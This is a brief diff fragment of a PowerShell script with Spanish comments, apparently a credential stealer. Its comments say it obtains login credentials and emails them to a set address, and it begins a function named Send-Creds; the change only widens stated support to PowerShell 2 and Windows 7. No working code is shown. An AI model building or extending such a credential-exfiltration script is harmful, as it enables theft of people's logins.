@@ -6,7 +6,7 @@
 # 2 - Obtiene las credenciales de inicio de sesion
 # 3 - Envia la informacion al correo especificado
 
-# Funciona con Powershell 3+ o sea con win8+
+# Funciona con Powershell 2+ o sea desde win7+
 
 Function Send-Creds {
 	Param (
